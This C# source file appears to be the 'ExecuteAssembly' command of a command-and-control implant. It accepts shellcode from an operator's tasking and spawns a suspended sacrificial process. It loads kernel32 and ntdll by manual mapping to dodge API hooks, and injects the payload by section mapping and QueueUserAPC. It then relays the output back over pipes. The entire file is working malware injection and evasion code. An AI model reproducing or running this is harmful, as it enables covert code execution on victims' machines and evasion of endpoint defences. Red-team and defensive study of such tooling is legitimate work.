using Engineer.Commands;
using Engineer.Extra;
using Engineer.Models;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Engineer.Functions;
using static Engineer.Extra.h_reprobate;
using System.IO.Pipes;

namespace Engineer.Commands
{
    internal class ExecuteAssembly : EngineerCommand
    {
        public override string Name => "ExecuteAssembly";

        private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
        private string Output { get; set; } = "";
       
        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //get some variuables ready for spawning process
                var si = new WinAPIs.Kernel32.STARTUPINFOEX();
                si.StartupInfo.cb = Marshal.SizeOf(si);
                var pi = new WinAPIs.Kernel32.PROCESS_INFORMATION();
                var pa = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
                pa.nLength = Marshal.SizeOf(pa);
                var ta = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
                ta.nLength = Marshal.SizeOf(ta);

                if (task.File.Length < 1)
                {
                    Tasking.FillTaskResults("Error: No file provided", task, EngTaskStatus.Failed,TaskResponseType.String);
                }
                //convert from base64 string to byte array
                byte[] shellcode = task.File;

                WinAPIs.Kernel32.SECURITY_ATTRIBUTES saAttr = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
                // Set the bInheritHandle flag so pipe handles are inherited. 

                saAttr.nLength = Marshal.SizeOf(saAttr);
                saAttr.bInheritHandle = true;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                // get the address of the saAttr
                IntPtr lpPipeAttributes = Marshal.AllocHGlobal(Marshal.SizeOf(saAttr));
                Marshal.StructureToPtr(saAttr, lpPipeAttributes, true);

                

                //create a named pipe and use it to set Console.Out and Console.Error
                var pipeCreation = WinAPIs.Kernel32.CreatePipe(out IntPtr outR_handle, out IntPtr outW_handle, ref saAttr, 0);
               var pipeCreation2 = WinAPIs.Kernel32.CreatePipe(out IntPtr inR_handle, out IntPtr inW_handle, ref saAttr, 0);

                
                //create an anonymous pipe server stream & client
                //var pipeServer = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
               // var pipeClient = new AnonymousPipeClientStream(PipeDirection.In, pipeServer.ClientSafePipeHandle);
                
                

                //call setHandleInformation to set the standard in write to not be inherited
               WinAPIs.Kernel32.SetHandleInformation(inW_handle, WinAPIs.Kernel32.HANDLE_FLAGS.INHERIT, 0);
                // //call setHandleInformation to set the standard out read to not be inherited
                WinAPIs.Kernel32.SetHandleInformation(outR_handle, WinAPIs.Kernel32.HANDLE_FLAGS.INHERIT, 0);

                //update the si hStdOutput to use our named pipe
                si.StartupInfo.hStdError = outW_handle;
                si.StartupInfo.hStdOutput = outW_handle;
               si.StartupInfo.hStdInput = inW_handle;
                si.StartupInfo.dwFlags = WinAPIs.Kernel32.STARTF_USESHOWWINDOW | (int)WinAPIs.Kernel32.CreationFlags.ExtendedStartupInfoPresent | WinAPIs.Kernel32.STARTF_USESTDHANDLES;

                // spawn new process 
                Tasking.FillTaskResults($"Attempting to create new process", task, EngTaskStatus.Running,TaskResponseType.String);
                var createProcessParameters = new object[] { $@"{SpawnTo.spawnToPath}", null, ta, pa, true, (uint)0x4, IntPtr.Zero, "C:\\Windows\\System32", si, pi };
                object successCreateProcess = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "CreateProcessW", typeof(WinApiDynamicDelegate.CreateProcessW), createProcessParameters);
                // makes sure we have access to the correct (out) pi values from the API invoke
                pi = (WinAPIs.Kernel32.PROCESS_INFORMATION)createProcessParameters[9];
            

                try
                {
                    bool? MapSuccess = null;
                    DateTime startTime = DateTime.Now;
                    Thread theThread = new Thread(() =>
                    {
                        MapSuccess = MapViewLoadShellcode(shellcode, pi.hProcess, pi.hThread);
                    } );
                    theThread.Start();
                    
                    //wait until MapSuccess is set to true or false
                    while (MapSuccess == null)
                    {
                        Thread.Sleep(100);
                    }
                    if(MapSuccess == true)
                    {
                        var buffer = new byte[1024];
                        uint bytesPeeked = 0;
                        uint bytesAvailable = 0;
                        uint bytesLeftThisMessage = 0;
                        do
                        {
                            bool peeked =  WinAPIs.Kernel32.PeekNamedPipe(outR_handle, null, 0, ref bytesPeeked,ref bytesAvailable, ref bytesLeftThisMessage);
                            if (peeked == false)
                            {
                                //Console.WriteLine($"failed to peek pipe with error code {Marshal.GetLastWin32Error()}");
                            }
                            //Console.WriteLine($"peeked {bytesAvailable} bytes from pipe");
                            if (task.cancelToken.IsCancellationRequested)
                            {
                                theThread.Abort();
                                Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled,TaskResponseType.String);
                                return;
                            }

                            var readSuccess = WinAPIs.Kernel32.ReadFile(outR_handle, buffer, (uint)buffer.Length,
                                out uint bytesRead, IntPtr.Zero);
                            if (readSuccess == false)
                            {
                                //Console.WriteLine($"read failed with error code {Marshal.GetLastWin32Error()}");
                            }

                            if (bytesRead > 0)
                            {
                                //Console.WriteLine($"read {bytesRead} bytes from pipe");
                                Output = Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
                                Tasking.FillTaskResults(Output, task, EngTaskStatus.Running,TaskResponseType.String);
                                buffer = new byte[1024];
                                bytesRead = 0;
                            }
                            else if (bytesRead == 0 && DateTime.Now.Subtract(startTime).TotalMinutes > 1)
                            {
                                //Console.WriteLine("no bytes read from pipe in 1 minute");
                                break;
                            }
                            else
                            {
                                //Console.WriteLine("Sleeping no data from pipe");
                                Thread.Sleep(1000);
                            }
                        } 
                        while (bytesAvailable > 0 || DateTime.Now.Subtract(startTime).TotalMinutes < 1);
                    }
                    else
                    {
                        Tasking.FillTaskResults("[-]MapViewLoadShellcode failed", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    }
                    //once the process is done, read the output from the pipe and send it back to the server
                   // Console.WriteLine("Exited while loop");
                    var buffer2 = new byte[1024];
                    var readSuccess2 = WinAPIs.Kernel32.ReadFile(outR_handle, buffer2, (uint)buffer2.Length, out uint bytesRead2, IntPtr.Zero);
                    Output = Encoding.UTF8.GetString(buffer2, 0, (int)bytesRead2);
                    Tasking.FillTaskResults(Output, task, EngTaskStatus.Complete,TaskResponseType.String);
                    
                 }
                
                catch (Exception ex)
                {
                   // Console.WriteLine(ex.Message);
                   // Console.WriteLine(ex.StackTrace);
                    Tasking.FillTaskResults(ex.Message, task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                }
                
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
            }
        }
        
        
        public static bool MapViewLoadShellcode(byte[] shellcode, IntPtr hProcess, IntPtr hThread)
        {
            var ntdll = reprobate.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");


            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // dinvoke nt create section
            // make object that holds the input parameters for the api
            var createSectionParameters = new object[] { hSection, (uint)0x10000000, IntPtr.Zero, maxSize, (uint)0x40, (uint)0x08000000, IntPtr.Zero };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtCreateSection", typeof(WinApiDynamicDelegate.NtCreateSection), createSectionParameters, false);
            hSection = (IntPtr)createSectionParameters[0];

            // dinvoke map view of section local
            IntPtr localBaseAddress = new IntPtr();
            ulong viewSize = new ulong();
            var mapViewParameters = new object[] { hSection, Process.GetCurrentProcess().Handle, localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x04 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            localBaseAddress = (IntPtr)mapViewParameters[2];

            // writeProcessMemory locally so we can map it to target after
            var numberOfBytes = new IntPtr();
            var writeProcessParameters = new object[] { Process.GetCurrentProcess().Handle, localBaseAddress, shellcode, (uint)shellcode.Length, numberOfBytes };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
            numberOfBytes = (IntPtr)writeProcessParameters[4];
           // Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");

            // dinvoke map view of section remote which basically copies shellcode
            IntPtr remoteBaseAddress = new IntPtr();
            mapViewParameters = new object[] { hSection, hProcess, remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x20 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            remoteBaseAddress = (IntPtr)mapViewParameters[2];
           // Console.WriteLine($"Mapped view to target");

            // Queue user APC
            var queueUserParameters = new object[] { remoteBaseAddress, hThread, (uint)0 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "QueueUserAPC", typeof(WinApiDynamicDelegate.QueueUserAPC), queueUserParameters, false);

            // resume thread to activate 
            var resumeThreadnParameters = new object[] { hThread };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            object createThreadResult = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "ResumeThread", typeof(WinApiDynamicDelegate.ResumeThread), resumeThreadnParameters, false);

            reprobate.FreeModule(ntdll);
            reprobate.FreeModule(ker32);

            if ((uint)createThreadResult == 1)
            {
               // Console.WriteLine("resumed thread");
                return true;
            }
            else
            {
               // Console.WriteLine("resumed thread failed");
                return false;
            }
        }
    }
}
